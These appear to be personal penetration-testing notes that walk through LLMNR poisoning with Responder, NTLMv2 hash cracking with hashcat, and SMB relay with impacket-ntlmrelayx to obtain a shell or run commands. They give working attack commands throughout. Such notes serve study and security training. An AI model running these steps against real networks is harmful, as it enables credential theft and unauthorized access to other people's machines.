## LLMNR Poisoning:

LLMNR (Link Local Multicast Name Resolution), is used to identify hosts when DNS fails to do so. It was previously known as NBT-NS.

The key flaw is that the services utilize a user's username and NTLMv2 hash when appropriately responded to. This attack is a MITM attack.

LLMNR Poisoning can be carried out using the below steps:

- Run **_responder_** using the following syntax: **_`responder -I tun0 -dwP -v`_**. Responder is mainly used to intercept and respond to network traffic.

**NOTE:** The **_`-I`_** switch is used to specify the type of network adapter being used by the attacker machine, either **_tun0_** or **_eth0_**.

- You can simulate an SMB share connection by entering this **_`\\<kali IP>\`_** in the folder path section of the Windows File Explorer. 

 When the Windows target machine makes a connection attempt, the **_responder_** intercepts this request and extracts the target's IP address, username and the NTLMv2 hash.

![[Pasted image 20250121003128.png]]

- This extracted hash can be further cracked using **_`hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt`_**.
***
## SMB Relay Attacks:

In SMB Relay attack, hashed gathered with responder are not cracked but relayed to specific machines to gain access. 

**NOTE:** **SMB signing** must be disabled or not enforced on the target. The credentials being relayed must be admin credentials to have any real value.

### Steps to perform SMB Relay attack:

- Identify hosts without SMB signing. This can be done using Nmap Scripts with the following command:
**_`nmap --script=smb2-security-mode.nse -p 445 <target IP>`_**

![[Pasted image 20250205184023.png]]

- Once a host with **_Message signing enabled but not required_** message being displayed has been identified, the following changes have to be made to responder within the **_`/etc/responder/Responder.conf`_**

![[Pasted image 20250205184408.png]]

For hashes to be relayed and not just captured, make sure to turn **_SMB_** and **_HTTP_** switches off. 

- Once this setup has been done, run responder using **_`responder -I <relevant network interface> -dwP -v`_**

Then setup the relay using **_`impacket-ntlmrelayx.py -tf <target list file> -smb2support`_**

**NOTE:** The target list file will contain the IP address of the target with **_Message signing enabled but not required_** message being displayed.

- In order to intercept the hashes, the target machine should establish a connection. When the connection attempt is made, the relayed hashes are dumped to the **_ntlmrelayx_** output.

**NOTE:** **_`impacket-ntlmrelayx.py -tf <target.txt> -smb2support -i`_** can be used to get an interactive shell which is provided by the **_`-i`_** flag. 
 
![[Pasted image 20250206012929.png]]

To connect to this shell, launch a NetCat Bind shell on the KALI machine with the port number mentioned within the relay output.
![[Pasted image 20250206013019.png]]

**NOTE:** You can also run a command with the relay using the **_`-c`_** switch:
**_`impacket-ntlmrelayx -tf target.txt -smb2support -c "whoami"`_**

![[Pasted image 20250207010111.png]]
***
